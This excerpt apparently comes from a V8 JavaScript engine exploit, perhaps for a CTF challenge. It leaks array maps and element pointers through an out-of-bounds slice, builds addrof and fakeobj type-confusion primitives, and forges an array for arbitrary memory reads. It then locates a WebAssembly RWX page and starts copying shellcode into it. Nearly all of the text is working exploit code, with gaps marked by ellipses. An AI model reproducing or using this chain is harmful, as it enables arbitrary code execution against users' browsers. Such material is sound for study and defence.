...
var f_arr = [1.1, 2.2, 3.3];
var a_arr = f_arr.slice(f_arr);

console.log("[+] Map of float array: ", ftoh(a_arr[3]));
console.log("[+] Elements ptr of float arr: ", ftoh(a_arr[4]));


var o = [{"a":1}, {"b":2}, {"c": 3}];
var obj_arr = o.slice(o);

// you can find the obj_arr element ptr using f_arr element leaked ptr (subtract dp(obj_arr)-dp(a_arr))
var obj_arr_map = itof(ftoi(a_arr[3]) + 0x50n);
console.log("[+] Obj_arr map leaked: ", ftoh(obj_arr_map));

var obj_element_ptr = itof(ftoi(a_arr[4]) + 0x250n);
...
function addrof(leak_obj) {
	...
	arr = f_arr.slice(f_arr);

	//Swapping our array element's ptr to obj_arr elements's ptr
	//a_arr[4] = itof((ftoi(a_arr[4]) & 0xffffffff00000000n) + ftoi(obj_element_ptr));  //chutiyap way to do same thing..LOL
	arr[4] = obj_element_ptr;

	//console.log("[+] Elements ptr swapped to: ", ftoh(a_arr[4]));
...
function fakeobj(addr) { //type addr: BigInt
    ...
    arr[0] = itof(addr);  // store addr at 0 index
    arr[3] = obj_arr_map; //change float map to obj map
    //a_arr[3] = itof((ftoi(a_arr[3]) & 0xffffffff00000000n) + obj_arr_map);  //chutiyap way, not needed
    let fake = arr[0];  // fetch fakeobj as arr[0] because of type confusion
...
var fake_arr = [a_arr[3], 1.1, 1.2, 1.3]
...
var rwx_page_addr = ftoi(read(addrof(wasm_instance) + 0x68n));  //0x68n is the distance of rwx page from base

console.log("[+] Addr of RWX page: 0x" + addrof(rwx_page_addr).toString(16));
...
function copy_shellcode(addr, shellcode) {
    ...
    let backing_store_addr = buf_addr + 0x14n; //cross check this using DebugPrint on buf to see where backing store is (x/16xw $buf)
